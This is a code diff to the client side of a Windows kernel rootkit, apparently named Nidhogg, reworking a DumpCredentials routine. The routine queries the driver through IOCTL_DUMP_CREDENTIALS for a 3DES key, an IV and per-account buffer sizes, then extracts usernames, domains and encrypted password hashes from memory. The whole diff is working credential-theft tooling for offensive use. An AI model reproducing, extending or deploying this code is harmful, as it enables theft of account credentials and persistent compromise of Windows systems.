@@ -16,11 +16,6 @@ void MemoryHandler::HandleCommand(_In_ std::string command) {
 	std::string commandName = params.at(0);
 	params.erase(params.begin());
 
-	if (params.size() == 0) {
-		PrintHelp();
-		return;
-	}
-
 	if (commandName.compare("dump_creds") == 0) {
 		if (params.size() != 0) {
 			PrintHelp();
@@ -319,33 +314,46 @@ void MemoryHandler::HandleCommand(_In_ std::string command) {
  * @std::vector<Credentials> -- A vector containing the dumped credentials.
  */
 CredentialsInformation MemoryHandler::DumpCredentials() {
+	IoctlCredentialsSize* credentialsSize = nullptr;
 	IoctlCredentialsInformation credentials{};
 	CredentialsInformation info{};
 	Credential cred{};
 	DWORD returned = 0;
-	SIZE_T credSize = 0;
+	IoctlCredentialsInfoSize credSize = { 0 };
 	DWORD index = 0;
 	bool error = false;
 
-	// Generating cached credentials.
-	if (!DeviceIoControl(*hNidhogg.get(), IOCTL_DUMP_CREDENTIALS,
-		nullptr, 0, &credSize, sizeof(credSize), &returned, nullptr)) {
+	// Generating general structure size.
+	if (!DeviceIoControl(*hNidhogg.get(), 
+		IOCTL_DUMP_CREDENTIALS,
+		nullptr, 
+		0, 
+		&credSize, 
+		sizeof(credSize), 
+		&returned, 
+		nullptr)) {
 		throw MemoryHandlerException("Failed to get credentials size from driver.");
 	}
 
-	if (credSize == 0)
+	if (credSize.CredentialsCount == 0 ||
+		credSize.DesKeySize == 0 ||
+		credSize.IvSize == 0) {
 		throw MemoryHandlerException("No credentials found or an error occurred while getting credentials size.");
+	}
+	credentials.DesKey.Size = credSize.DesKeySize;
+	credentials.Iv.Size = credSize.IvSize;
+	credentials.Count = credSize.CredentialsCount;
 
-	// Get 3DES key.
+	// Allocating info.
 	try {
-		credentials.DesKey.Data = SafeAlloc<PVOID>(credentials.DesKey.Size);
+		credentials.DesKey.Data = SafeAlloc<PVOID>(credSize.DesKeySize);
 	}
 	catch (const SafeMemoryException& e) {
 		throw MemoryHandlerException(e.what());
 	}
 
 	try {
-		credentials.Iv.Data = SafeAlloc<PVOID>(credentials.Iv.Size);
+		credentials.Iv.Data = SafeAlloc<PVOID>(credSize.IvSize);
 	}
 	catch (const SafeMemoryException& e) {
 		SafeFree(credentials.DesKey.Data);
@@ -353,7 +361,7 @@ CredentialsInformation MemoryHandler::DumpCredentials() {
 	}
 
 	try {
-		credentials.Creds = SafeAlloc<IoctlCredentials*>(credSize * sizeof(IoctlCredentials));
+		credentials.Creds = SafeAlloc<IoctlCredentials*>(credSize.CredentialsCount * sizeof(IoctlCredentials));
 	}
 	catch (const SafeMemoryException& e) {
 		SafeFree(credentials.DesKey.Data);
@@ -361,13 +369,76 @@ CredentialsInformation MemoryHandler::DumpCredentials() {
 		throw MemoryHandlerException(e.what());
 	}
 
-	if (!DeviceIoControl(*hNidhogg.get(), IOCTL_DUMP_CREDENTIALS,
-		&credentials, sizeof(IoctlCredentialsInformation), &credentials, sizeof(IoctlCredentialsInformation), 
-		&returned, nullptr)) {
+	try {
+		credentialsSize = SafeAlloc<IoctlCredentialsSize*>(credSize.CredentialsCount * sizeof(IoctlCredentialsSize));
+	}
+	catch (const SafeMemoryException& e) {
+		SafeFree(credentials.Creds);
+		SafeFree(credentials.DesKey.Data);
+		SafeFree(credentials.Iv.Data);
+		throw MemoryHandlerException(e.what());
+	}
+
+	// Getting credentials size.
+	if (!DeviceIoControl(*hNidhogg.get(), 
+		IOCTL_DUMP_CREDENTIALS,
+		&credentialsSize, 
+		sizeof(IoctlCredentialsSize), 
+		&credentialsSize, 
+		sizeof(IoctlCredentialsSize),
+		&returned, 
+		nullptr)) {
+		SafeFree(credentialsSize);
 		SafeFree(credentials.Creds);
 		SafeFree(credentials.Iv.Data);
 		SafeFree(credentials.DesKey.Data);
-		throw MemoryHandlerException("Failed to get DES key data from driver.");
+		throw MemoryHandlerException("Failed to get credentials from the driver.");
+	}
+
+	for (index = 0; index < credentials.Count; index++) {
+		credentials.Creds[index].Username.Buffer = SafeAlloc<WCHAR*>(credentialsSize[index].UsernameAllocSize);
+		credentials.Creds[index].Domain.Buffer = SafeAlloc<WCHAR*>(credentialsSize[index].DomainAllocSize);
+		credentials.Creds[index].EncryptedHash.Buffer = SafeAlloc<WCHAR*>(credentialsSize[index].EncryptedHashAllocSize);
+
+		if (!credentials.Creds[index].Username.Buffer || 
+			!credentials.Creds[index].Domain.Buffer || 
+			!credentials.Creds[index].EncryptedHash.Buffer) {
+			error = true;
+			break;
+		}
+	}
+	SafeFree(credentialsSize);
+
+	if (error) {
+		for (DWORD i = 0; i < index; i++) {
+			SafeFree(credentials.Creds[i].Username.Buffer);
+			SafeFree(credentials.Creds[i].Domain.Buffer);
+			SafeFree(credentials.Creds[i].EncryptedHash.Buffer);
+		}
+		SafeFree(credentials.Creds);
+		SafeFree(credentials.Iv.Data);
+		SafeFree(credentials.DesKey.Data);
+		throw MemoryHandlerException("Failed to allocate memory for credentials.");
+	}
+
+	// Now getting the credentials.
+	if (!DeviceIoControl(*hNidhogg.get(), 
+		IOCTL_DUMP_CREDENTIALS,
+		&credentials, 
+		sizeof(IoctlCredentialsInformation), 
+		&credentials, 
+		sizeof(IoctlCredentialsInformation), 
+		&returned, 
+		nullptr)) {
+		for (DWORD i = 0; i < credentials.Count; i++) {
+			SafeFree(credentials.Creds[i].Username.Buffer);
+			SafeFree(credentials.Creds[i].Domain.Buffer);
+			SafeFree(credentials.Creds[i].EncryptedHash.Buffer);
+		}
+		SafeFree(credentials.Creds);
+		SafeFree(credentials.Iv.Data);
+		SafeFree(credentials.DesKey.Data);
+		throw MemoryHandlerException("Failed to get credentials from the driver.");
 	}
 
 	for (DWORD i = 0; i < credentials.DesKey.Size; i++) {
@@ -377,6 +448,7 @@ CredentialsInformation MemoryHandler::DumpCredentials() {
 	for (DWORD i = 0; i < credentials.Iv.Size; i++) {
 		info.Iv.push_back(static_cast<UCHAR*>(credentials.Iv.Data)[i]);
 	}
+	std::cout << "Credentials count: " << std::dec << credentials.Count << std::endl;
 
 	for (SIZE_T i = 0; i < credentials.Count; i++) {
 		cred.Username = std::wstring(credentials.Creds[i].Username.Buffer, credentials.Creds[i].Username.Length / sizeof(WCHAR));
